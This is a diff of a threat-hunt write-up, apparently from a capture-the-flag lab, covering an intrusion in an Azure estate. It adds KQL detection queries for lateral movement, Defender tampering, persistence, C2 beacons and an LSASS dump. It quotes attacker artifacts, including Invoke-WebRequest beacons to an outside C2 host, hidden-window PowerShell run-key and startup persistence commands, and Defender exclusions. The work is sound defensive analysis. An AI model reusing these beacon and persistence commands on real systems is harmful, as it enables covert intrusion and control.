@@ -30,176 +30,378 @@ A post-intrusion threat hunt inside a corporate Azure estate. The breach was alr
 
 ### Initial Access — Credential Reuse from a Compromised Workstation
 
-At **09:27:58 UTC**, `vmadminusername` authenticated to `azwks-phtg-02` from `173.244.55.131` — the IP of `sarah-chen`'s workstation. Pre-logon failure events show `UnauthorizedLogonType`, not wrong passwords — the credentials were valid from the first attempt. No brute force, no spray. The account was already compromised.
+At **09:27:58 UTC**, `vmadminusername` authenticated to `azwks-phtg-02` from `173.244.55.131` — the IP of `sarah-chen`'s workstation. Pre-logon failure events show `UnauthorizedLogonType`, not wrong passwords — the credentials were valid from the first attempt. No brute force, no spray. `sarah-chen`'s machine is not a relay — it is the operator's external launch point.
 
-`sarah-chen`'s machine is not a relay — it is the operator's external launch point.
-
-**MITRE:** T1078 — Valid Accounts
+```kql
+// Trace the external logon and confirm sarah-chen as the launch point
+DeviceLogonEvents
+| where TimeGenerated between (datetime(2025-12-13T09:40:00Z) .. datetime(2025-12-13T18:00:00Z))
+| where RemoteDeviceName contains "sarah"
+| project TimeGenerated, DeviceName, AccountName, LogonType, RemoteIP, RemoteDeviceName
+| order by TimeGenerated asc
+```
 
 ![P01 — Cold Trail](assets/p01-cold-trail.png)
+
+```kql
+// Confirm no brute force — failed logons show UnauthorizedLogonType, not bad credentials
+DeviceLogonEvents
+| where TimeGenerated between (datetime(2025-12-13T09:00:00Z) .. datetime(2025-12-13T09:28:00Z))
+| where DeviceName == "azwks-phtg-02"
+| where ActionType == "LogonFailed"
+| project TimeGenerated, AccountName, LogonType, RemoteIP, FailureReason
+| order by TimeGenerated asc
+```
+
 ![Q01 — Brute Force Assumption](assets/q01-brute-force-assumption.png)
+
+**MITRE:** T1078 — Valid Accounts
 
 ---
 
 ### Lateral Movement — Pre-Staged RDP File
 
-**21 minutes after entry**, at 09:48 UTC, the operator launched a pre-staged RDP file from the Downloads folder:
+**21 minutes after entry**, at 09:48 UTC, the operator launched a pre-staged RDP file already on disk in the Downloads folder — a planned pivot to a specific second target, not exploratory movement. `CredentialUIBroker` fired immediately after `mstsc.exe`. No further lateral movement beyond `azwks-phtg-01` was detected.
 
+```kql
+// Find the pre-staged RDP file launch on the entry host
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-12-13T09:27:00Z) .. datetime(2025-12-13T10:00:00Z))
+| where DeviceName == "azwks-phtg-02"
+| where AccountName == "vmadminusername"
+| project TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessFileName
+| order by TimeGenerated asc
 ```
-C:\Users\vmAdminUsername\Downloads\azwks-phtg-01 (1).rdp
-```
-
-The file was already on disk. The operator came prepared — this was not exploratory movement, it was a planned pivot to a specific second target. `CredentialUIBroker` fired immediately after `mstsc.exe`, and a successful logon to `azwks-phtg-01` (10.0.0.105) was recorded. No further lateral movement beyond this second hop was detected.
-
-**MITRE:** T1021.001 — Remote Services: Remote Desktop Protocol
 
 ![P02 — First Footsteps](assets/p02-first-footsteps.png)
+
+```kql
+// Confirm the logon to the pivot host and check for onward movement
+DeviceLogonEvents
+| where TimeGenerated between (datetime(2025-12-13T09:00:00Z) .. datetime(2025-12-13T18:00:00Z))
+| where RemoteIP == "10.0.0.152"
+| project TimeGenerated, DeviceName, AccountName, LogonType, RemoteIP, RemoteDeviceName
+| order by TimeGenerated asc
+```
+
 ![Q02 — Lateral Movement](assets/q02-lateral-movement.png)
+
+**MITRE:** T1021.001 — Remote Services: Remote Desktop Protocol
 
 ---
 
 ### Tooling Deployment — Download-Then-Execute
 
-On `azwks-phtg-01`, a pre-staged PowerShell script (`_.ps1` from the user-profile PHTG directory) made an outbound HTTPS call to `updates.health-cloud.cc`. **One second later**, `PHtGHealthCloudSvc.exe` launched — the script fetched the binary and executed it immediately. Classic download-then-execute: the PS1 is the bridge between the staging server and the host.
+A pre-staged `_.ps1` script made an outbound HTTPS call to `updates.health-cloud.cc`. **One second later**, `PHtGHealthCloudSvc.exe` launched — classic download-then-execute. All tooling staged under `C:\ProgramData\PHTG\HealthCloud\`. The implant spoofed `bitsadmin.exe` via VersionInfo tampering, separated from legitimate FileName/OriginalFileName mismatches by its staging path. All PowerShell execution used `-WindowStyle Hidden -ExecutionPolicy Bypass`.
 
-All operator tooling was staged under `C:\ProgramData\PHTG\HealthCloud\` across three subdirectories (`Cache`, `Bin`, `TempCache`), masquerading as a legitimate health cloud software installation.
-
-The implant `PHtGHealthCloudSvc.exe` spoofed `bitsadmin.exe` via VersionInfo tampering — running from a staging path rather than a system directory, which is what separated it from the background noise of other FileName/OriginalFileName mismatches.
-
-All PowerShell execution used:
-```powershell
--WindowStyle Hidden -ExecutionPolicy Bypass
+```kql
+// Find the first operator script and expose the concealment flags
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-12-13T09:48:00Z) .. datetime(2025-12-13T18:00:00Z))
+| where DeviceName == "azwks-phtg-01"
+| where AccountName == "vmadminusername"
+| where FileName == "powershell.exe"
+| project TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessFileName
+| order by TimeGenerated asc
+| take 1
 ```
 
-**MITRE:** T1105 — Ingress Tool Transfer, T1036.003 — Masquerading: Rename System Utilities, T1059.001 — PowerShell, T1564.003 — Hidden Window
-
 ![Q04 — First Operator Script](assets/q04-first-operator-script.png)
+
+```kql
+// Identify the LOLBin masquerade — FileName differs from OriginalFileName in the operator's binary
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-12-13T09:00:00Z) .. datetime(2025-12-13T18:00:00Z))
+| where DeviceName == "azwks-phtg-01"
+| where AccountName == "vmadminusername"
+| where FileName != ProcessVersionInfoOriginalFileName
+| where ProcessVersionInfoOriginalFileName != ""
+| project TimeGenerated, FileName, ProcessVersionInfoOriginalFileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName
+| order by TimeGenerated desc
+```
+
 ![Q08 — LOLBin Masquerade](assets/q08-lolbin-masquerade.png)
+
+```kql
+// Confirm the download-then-execute pattern — outbound call 1 second before binary launch
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-12-13T10:12:00Z) .. datetime(2025-12-13T18:00:00Z))
+| where DeviceName == "azwks-phtg-01"
+| project TimeGenerated, ProcessCommandLine
+| order by TimeGenerated asc
+```
+
 ![Q18 — Deployment Pattern](assets/q18-deployment-pattern.png)
+
+**MITRE:** T1105 — Ingress Tool Transfer, T1036.003 — Masquerading: Rename System Utilities, T1059.001 — PowerShell, T1564.003 — Hidden Window
 
 ---
 
 ### Defense Evasion — Silencing Defender Before Persistence Lands
 
-Before planting persistence, the operator ran `AMSI_probe.ps1` to confirm the environment wouldn't detonate alerts, then applied a temporary Defender exclusion via `Add-MpPreference` against the user-profile PHTG path. The exclusion was removed with `Remove-MpPreference` within seconds — a window just long enough for the payload to drop without triggering a detection, short enough to avoid a permanent exclusion that would attract attention.
+The operator ran `AMSI_probe.ps1` to confirm the environment was safe, then briefly excluded the PHTG user-profile path via `Add-MpPreference` — removed within seconds, just long enough for the payload to drop. After persistence landed, two permanent exclusions were added via `msmpeng.exe`. Defender detected `PHTG HealthCloud.lnk` but `WasExecutingWhileDetected: false` confirms it didn't block. `attrib.exe` hid files across `Cache` (17 hits) and `TempCache` (2 hits). Two `cmd.exe` invocations broke parent-process lineage.
 
-After persistence was in place, two permanent exclusions were added:
-
-```powershell
-# Written via msmpeng.exe — Defender blinding itself
-ExclusionPath:    C:\ProgramData\PHTG\HealthCloud\Cache
-ExclusionProcess: C:\ProgramData\PHTG\HealthCloud\PHTGHealthCloudSvc.exe
+```kql
+// Confirm Defender exclusions written via msmpeng.exe
+DeviceRegistryEvents
+| where TimeGenerated between (datetime(2025-12-13T09:00:00Z) .. datetime(2025-12-13T18:00:00Z))
+| where DeviceName == "azwks-phtg-01"
+| where RegistryKey contains "Defender"
+| project TimeGenerated, ActionType, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessFileName
+| order by TimeGenerated asc
 ```
 
-Defender detected `PHTG HealthCloud.lnk` and generated two `AntivirusReport` events — but `WasExecutingWhileDetected: false` confirms persistence was already in place when caught. Detection without blocking.
+![P06 — Doors Held Open](assets/p06-doors-held-open.png)
 
-`attrib.exe` applied hidden+system attributes across `Cache` (17 modifications) and `TempCache` (2 modifications). Two `cmd.exe` invocations chained payload launches to break parent-process lineage in telemetry.
+```kql
+// Find attrib.exe usage and count modifications per staging directory
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-12-13T09:00:00Z) .. datetime(2025-12-13T18:00:00Z))
+| where DeviceName == "azwks-phtg-01"
+| where FileName == "attrib.exe"
+| extend Dir = case(
+    ProcessCommandLine contains "\\Cache\\", "Cache",
+    ProcessCommandLine contains "\\TempCache\\", "TempCache",
+    "other")
+| summarize Count = count() by Dir
+| order by Count desc
+```
+
+![Q07 — Attrib Commands](assets/q07-attrib-commands.png)
+
+```kql
+// Surface the AMSI probe from the non-encoded PowerShell scripts in the Bin directory
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-12-13T10:12:00Z) .. datetime(2025-12-13T18:00:00Z))
+| where DeviceName == "azwks-phtg-01"
+| where FileName == "powershell.exe"
+| where ProcessCommandLine !contains "-EncodedCommand"
+| where ProcessCommandLine contains "Bin"
+| project TimeGenerated, ProcessCommandLine, InitiatingProcessCommandLine
+| order by TimeGenerated asc
+```
+
+![Q20 — AMSI Probe](assets/q20-amsi-probe.png)
+
+```kql
+// Detect the permanent Defender exclusions added after persistence
+DeviceEvents
+| where DeviceName == "azwks-phtg-01"
+| where TimeGenerated between (datetime(2025-12-13T09:48:40Z) .. datetime(2025-12-13T18:00:00Z))
+| where ActionType == "PowerShellCommand"
+| where AdditionalFields contains "Add-MpPreference"
+| project TimeGenerated, AdditionalFields
+| order by TimeGenerated asc
+```
+
+![Q22 — Defender Tampering](assets/q22-defender-tampering.png)
+
+```kql
+// Prove the add-then-remove pattern on the temporary exclusion
+DeviceEvents
+| where DeviceName == "azwks-phtg-01"
+| where TimeGenerated between (datetime(2025-12-13T10:11:00Z) .. datetime(2025-12-13T10:12:30Z))
+| where ActionType == "PowerShellCommand"
+| where AdditionalFields contains "MpPreference"
+| project TimeGenerated, AdditionalFields
+| order by TimeGenerated asc
+```
+
+![Q24 — Temp Exclusion Add](assets/q24-temp-exclusion-add.png)
 
 **MITRE:** T1562.001 — Impair Defenses: Disable or Modify Tools, T1564 — Hide Artifacts, T1059.003 — cmd.exe Lineage Break
-
-![P06 — Doors Held Open](assets/p06-doors-held-open.png)
-![Q07 — Attrib Commands](assets/q07-attrib-commands.png)
-![Q20 — AMSI Probe](assets/q20-amsi-probe.png)
-![Q22 — Defender Tampering](assets/q22-defender-tampering.png)
-![Q24 — Temp Exclusion Add](assets/q24-temp-exclusion-add.png)
 
 ---
 
 ### Persistence — Three Mechanisms
 
+All three mechanisms installed at **10:13 UTC** — 25 minutes after landing on `azwks-phtg-01`.
+
 **1. Startup LNK — fires at every user logon**
 ```powershell
-C:\Users\vmAdminUsername\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\PHTG HealthCloud.lnk
+C:\Users\vmAdminUsername\AppData\...\Startup\PHTG HealthCloud.lnk
 → PowerShell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\PHTG\HealthCloud\Cache\task_FLAG-05.ps1
 ```
 
-**2. Run Key — fires at every user logon (independent path)**
+**2. Run Key — independent logon-triggered path**
 ```
 HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 Value: PHTGHealthCloudTray
 Data:  powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\ProgramData\PHTG\HealthCloud\Bin\HealthCloudTray.ps1"
 ```
 
-**3. HKLM EventLog Registration — blends implant activity into trusted log streams**
+**3. HKLM EventLog Registration — blends implant writes into trusted Application log telemetry**
 ```
 HKLM\SYSTEM\ControlSet001\Services\EventLog\Application\PHTGHealthCloud
 ```
-Registering a custom Application event log source allows the implant to write to the Windows Application log under its own name — activity that sits inside trusted telemetry and draws far less scrutiny than events in an unknown log.
 
-All three mechanisms were installed at **10:13 UTC** — 25 minutes after landing on `azwks-phtg-01`.
-
-**MITRE:** T1547.001 — Registry Run Keys / Startup Folder, T1112 — Modify Registry
+```kql
+// Find the Startup LNK creation
+DeviceFileEvents
+| where TimeGenerated between (datetime(2025-12-13T09:00:00Z) .. datetime(2025-12-13T18:00:00Z))
+| where DeviceName == "azwks-phtg-01"
+| where FolderPath contains "Startup"
+| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated asc
+```
 
 ![P03 — Quiet Roots](assets/p03-quiet-roots.png)
+![Q13 — Startup LNK](assets/q13-startup-lnk.png)
+
+```kql
+// Isolate the operator's Run key entry from the background OS churn
+DeviceRegistryEvents
+| where TimeGenerated > datetime(2025-12-13T09:48:00Z)
+| where DeviceName == "azwks-phtg-01"
+| where InitiatingProcessAccountName =~ "vmadminusername"
+| where RegistryKey !contains "CLSID"
+| where RegistryKey !contains "MuiCache"
+| where RegistryKey !contains "Themes"
+| where RegistryKey contains "Run" or RegistryKey contains "Startup" or RegistryKey contains "Services"
+| project TimeGenerated, ActionType, RegistryKey, RegistryValueName, RegistryValueData
+| order by TimeGenerated asc
+```
+
 ![Q10 — Persistence Signal](assets/q10-persistence-signal.png)
 ![Q11 — Run Key Value](assets/q11-run-key-value.png)
-![Q13 — Startup LNK](assets/q13-startup-lnk.png)
+
+```kql
+// Confirm the HKLM EventLog source registration
+DeviceRegistryEvents
+| where TimeGenerated > datetime(2025-12-13T09:48:00Z)
+| where DeviceName == "azwks-phtg-01"
+| where InitiatingProcessAccountName =~ "vmadminusername"
+| where RegistryKey startswith "HKEY_LOCAL_MACHINE"
+| project TimeGenerated, ActionType, RegistryKey, RegistryValueName, RegistryValueData
+| order by TimeGenerated asc
+```
+
 ![Q14 — HKLM Registry](assets/q14-hklm-registry.png)
+
+**MITRE:** T1547.001 — Registry Run Keys / Startup Folder, T1112 — Modify Registry
 
 ---
 
 ### Command & Control — Dual Beacons, Cloudflare-Fronted
 
-**Channel 1 — implant healthcheck loop:**
-`PHtGHealthCloudSvc.exe` (masquerading as `bitsadmin.exe`) ran a persistent beacon loop, firing **22 healthcheck executions** during post-access activity to confirm the implant was alive.
+**Channel 1 — implant healthcheck loop:** `PHtGHealthCloudSvc.exe` (masquerading as `bitsadmin.exe`) fired **22 healthcheck executions** to confirm liveness.
 
-**Channel 2 — encoded PowerShell beacons:**
-Two `-EncodedCommand` payloads decoded via `base64_decode_tostring()` in KQL:
-
+**Channel 2 — Base64-encoded PowerShell beacons** decoded via `base64_decode_tostring()` in KQL:
 ```powershell
 Invoke-WebRequest -Uri "https://status.health-cloud.cc/api/checkin?device=azwks-phtg-01" -UseBasicParsing -TimeoutSec 5 | Out-Null
 Invoke-WebRequest -Uri "https://status.health-cloud.cc/api/status?device=azwks-phtg-01"  -UseBasicParsing -TimeoutSec 5 | Out-Null
 ```
 
-Both subdomains resolved to Cloudflare-fronted IPs over port 443/TLS, blending with normal HTTPS traffic. The dual-channel design is deliberate: if one channel is cut, the operator retains access via the other, and each channel serves a distinct function (liveness vs. tasking).
+Both resolved to Cloudflare-fronted IPs over 443/TLS. Dual-channel: if one is cut, the other survives; each serves a distinct function (liveness vs. tasking).
 
-```
-health-cloud.cc
-├── updates.health-cloud.cc → 104.21.36.232 (Cloudflare)
-└── status.health-cloud.cc  → 172.67.200.204 (Cloudflare)
+```kql
+// Count healthcheck beacon executions
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-12-13T09:00:00Z) .. datetime(2025-12-13T18:00:00Z))
+| where DeviceName == "azwks-phtg-01"
+| where ProcessVersionInfoOriginalFileName =~ "bitsadmin.exe"
+| count
 ```
 
-**MITRE:** T1071.001 — Application Layer Protocol: Web Protocols, T1027 — Obfuscated Files, T1090 — Proxy
+![Q15 — Healthcheck Loop](assets/q15-healthcheck-loop.png)
+
+```kql
+// Surface the encoded PowerShell beacons
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-12-13T09:00:00Z) .. datetime(2025-12-13T18:00:00Z))
+| where DeviceName == "azwks-phtg-01"
+| where ProcessCommandLine contains "EncodedCommand"
+| project TimeGenerated, ProcessCommandLine
+| order by TimeGenerated asc
+```
 
 ![P04 — Beacon Pair](assets/p04-beacon-pair.png)
-![P05 — Outbound Whispers](assets/p05-outbound-whispers.png)
-![Q15 — Healthcheck Loop](assets/q15-healthcheck-loop.png)
 ![Q16 — Encoded Beacons](assets/q16-encoded-beacons.png)
+
+```kql
+// Confirm resolved IPs and ports for both C2 subdomains
+DeviceNetworkEvents
+| where TimeGenerated between (datetime(2025-12-13T10:12:00Z) .. datetime(2025-12-13T10:16:00Z))
+| where DeviceName == "azwks-phtg-01"
+| where RemoteUrl contains "health-cloud" or RemoteIP != ""
+| project TimeGenerated, DeviceName, ActionType, RemoteIP, RemoteUrl, RemotePort, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated asc
+```
+
+![P05 — Outbound Whispers](assets/p05-outbound-whispers.png)
+
+**MITRE:** T1071.001 — Application Layer Protocol: Web Protocols, T1027 — Obfuscated Files, T1090 — Proxy
 
 ---
 
 ### Credential Access — LSASS Memory Read
 
-Among 139 `OpenProcessApiCall` events targeting `lsass.exe`, 138 came from expected baseline processes (MsMpEng, WmiPrvSE, SenseIR, system context). One did not: `powershell.exe` running under `vmadminusername`.
+Among 139 `OpenProcessApiCall` events on `lsass.exe`, one stood out: `powershell.exe` under `vmadminusername`. Two access requests fired one second apart — the second was `0x1FFFFF` (`PROCESS_ALL_ACCESS`). A `ReadProcessMemoryApiCall` confirmed the dump followed through.
 
-Two `OpenProcessApiCall` events fired one second apart:
-
-| Time | DesiredAccess | Meaning |
-|---|---|---|
-| T+0s | Query handle | Enumeration only |
-| T+1s | `0x1FFFFF` — `PROCESS_ALL_ACCESS` | Full read/write/memory access |
-
-The escalation from query to `PROCESS_ALL_ACCESS` is the signal. A `ReadProcessMemoryApiCall` event against `lsass.exe` confirmed the operator followed through — credential dump confirmed.
-
-**MITRE:** T1003.001 — OS Credential Dumping: LSASS Memory
+```kql
+// Isolate the non-baseline LSASS handle request
+DeviceEvents
+| where DeviceName == "azwks-phtg-01"
+| where TimeGenerated between (datetime(2025-12-13T09:48:40Z) .. datetime(2025-12-13T18:00:00Z))
+| where ActionType == "OpenProcessApiCall"
+| where FileName == "lsass.exe"
+| where InitiatingProcessAccountName != "system"
+| where InitiatingProcessAccountName != "network service"
+| where InitiatingProcessAccountName != "local service"
+| project TimeGenerated, InitiatingProcessFileName, InitiatingProcessAccountName, InitiatingProcessCommandLine
+| order by TimeGenerated asc
+```
 
 ![Q27 — LSASS Access](assets/q27-lsass-access.png)
+
+```kql
+// Decode both DesiredAccess values — 0x1FFFFF is PROCESS_ALL_ACCESS
+DeviceEvents
+| where DeviceName == "azwks-phtg-01"
+| where TimeGenerated between (datetime(2025-12-13T09:48:40Z) .. datetime(2025-12-13T18:00:00Z))
+| where ActionType == "OpenProcessApiCall"
+| where FileName == "lsass.exe"
+| where InitiatingProcessAccountName == "vmadminusername"
+| project TimeGenerated, AdditionalFields
+| order by TimeGenerated asc
+```
+
 ![Q28 — Access Rights](assets/q28-access-rights.png)
+
+```kql
+// Confirm the memory read followed the handle — dump confirmed
+DeviceEvents
+| where DeviceName == "azwks-phtg-01"
+| where TimeGenerated between (datetime(2025-12-13T09:48:40Z) .. datetime(2025-12-13T18:00:00Z))
+| where FileName == "lsass.exe"
+| summarize count() by ActionType
+```
+
 ![Q29 — Memory Read](assets/q29-memory-read.png)
+
+**MITRE:** T1003.001 — OS Credential Dumping: LSASS Memory
 
 ---
 
 ### Final Actions — M365 Targeting + Confirmed Live Access
 
-`phtg_activity.ps1` drove Edge to `login.microsoftonline.com` repeatedly — the operator targeting M365 authentication. Persistence confirmed firing independently at **13:40 UTC** via scheduled task, without an active RDP session.
+`phtg_activity.ps1` drove Edge to `login.microsoftonline.com` repeatedly. Persistence confirmed firing at **13:40 UTC** via scheduled task without an active RDP session. At **15:55 UTC**, `notepad.exe`, `calc.exe`, and `mspaint.exe` launched interactively — live desktop access confirmed, nearly 6.5 hours after initial entry.
 
-At **15:55 UTC**, the operator went hands-on-keyboard: `notepad.exe`, `calc.exe`, and `mspaint.exe` launched interactively — confirming live desktop access nearly 6.5 hours after initial entry.
-
-**MITRE:** T1078.004 — Valid Accounts: Cloud Accounts
+```kql
+// Trace final operator actions on the pivot host
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-12-13T10:30:00Z) .. datetime(2025-12-13T18:00:00Z))
+| where DeviceName == "azwks-phtg-01"
+| where AccountName == "vmadminusername"
+| project TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessFileName
+| order by TimeGenerated asc
+```
 
 ![P07 — M365 Auth](assets/p07-m365-auth.png)
 ![P07 — Scheduled Task](assets/p07-scheduled-task.png)
 ![P07 — Hands on Keyboard](assets/p07-hands-on-keyboard.png)
+
+**MITRE:** T1078.004 — Valid Accounts: Cloud Accounts
 
 ---
 
